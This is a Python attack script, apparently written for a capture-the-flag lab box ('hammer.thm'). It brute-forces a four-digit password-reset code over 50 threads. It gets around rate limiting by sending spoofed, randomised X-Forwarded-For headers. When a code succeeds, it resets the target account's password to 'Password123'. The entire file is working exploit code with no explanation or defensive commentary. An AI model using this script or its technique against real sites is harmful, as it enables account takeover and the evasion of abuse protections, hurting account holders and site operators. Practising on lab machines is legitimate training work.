import requests
import random
import threading
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

url = "http://10.10.216.73:1337/reset_password.php"
num_threads = 50
stop_flag = threading.Event()

# Retry mechanism
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[500, 502, 503, 504],
    raise_on_status=False
)

adapter = HTTPAdapter(max_retries=retry_strategy)
session = requests.Session()
session.mount("http://", adapter)

def brute_force_code(start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                },
                timeout=10,
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            elif "Invalid or expired recovery code!" not in r.text:
                stop_flag.set()
                print(f"[+] Found the recovery code: {code_str}")
                print("[+] Sending the new password request.")
                new_password = "Password123"
                session.post(
                    url,
                    data={
                        "new_password": new_password,
                        "confirm_password": new_password,
                    },
                    headers={
                        "X-Forwarded-For": f"127.0.{random.randint(0, 255)}.{random.randint(0, 255)}"
                    },
                )
                print(f"[+] Password is set to {new_password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            continue

def main():
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()